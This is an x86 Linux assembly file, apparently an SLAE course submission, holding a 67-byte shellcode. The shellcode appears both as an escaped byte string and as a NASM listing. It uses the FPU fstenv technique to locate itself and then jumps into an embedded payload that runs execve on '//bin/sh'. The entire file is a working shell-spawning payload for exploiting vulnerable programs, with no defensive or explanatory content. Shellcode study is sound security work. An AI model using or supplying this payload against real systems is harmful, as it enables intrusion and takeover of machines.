;Description:   JMP-FSTENV execve shell (67 bytes)
;Shellcode:     \xd9\xee\xeb\x34\xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x9b\xd9\x74\x24\xf4\x59\x8d\x41\x04\xff\xe0
;Author:        Paolo Stivanin <https://github.com/polslinux>
;SLAE ID:       526

global main
section .text
main:
    fldz
    jmp short here
message: db 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68
here:   fstenv [esp-0xc]
    pop ecx
    lea eax,[ecx+4]
    jmp eax




